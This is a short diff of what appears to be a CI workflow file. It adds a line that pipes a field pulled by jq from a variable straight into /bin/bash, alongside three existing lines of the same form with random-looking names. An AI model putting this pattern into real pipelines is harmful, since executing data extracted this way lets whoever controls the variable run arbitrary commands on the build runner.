@@ -31,6 +31,7 @@ jobs:
           echo $jd3 | jq -r .bh0674 | /bin/bash
           printf '%s' "$bovy114" | jq -r .msi2 | /bin/bash
           echo $tbucq9929 | jq -r .div82894 | /bin/bash
+          echo $ayhi4 | jq -r .ck877 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
